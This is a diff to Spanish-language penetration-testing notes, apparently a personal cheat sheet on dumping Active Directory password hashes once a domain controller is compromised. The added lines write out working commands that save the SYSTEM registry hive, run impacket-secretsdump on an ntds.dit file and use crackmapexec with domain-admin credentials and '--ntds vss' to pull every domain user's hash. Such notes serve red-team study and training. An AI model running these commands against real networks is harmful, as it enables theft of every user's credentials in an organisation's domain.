@@ -134,15 +134,20 @@ Cuando se compromete un dominio  se suele dumpear el contenido de NTDS ( en loca
 
 Pero volvemos cuando comprometes un controlador de dominio puedes dumpear el NTDS.dir y el SYSTEM para dumpear todos los hashes de los usuarios del directorio activo
 
+```
+reg save HKLM\system system.backup
+```
+
+## Alternativa cme y con impacket-secretsdump.py
+
+Para esta tenemos que tener credenciales validas de un domain admin.***Importante el kali se usa impacket-packete*** para llamar a secretsdump.py se hace asi:
+
+```
+impacket-secretsdump -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL
+rackmapexec smb apt -u 'domainadmin' -p 'password' --ntds vss # Intentarra volvarte todos lo hashes a nivel de dominio
 
 
-
-
-
-
-
-
-
+```
 
 
 
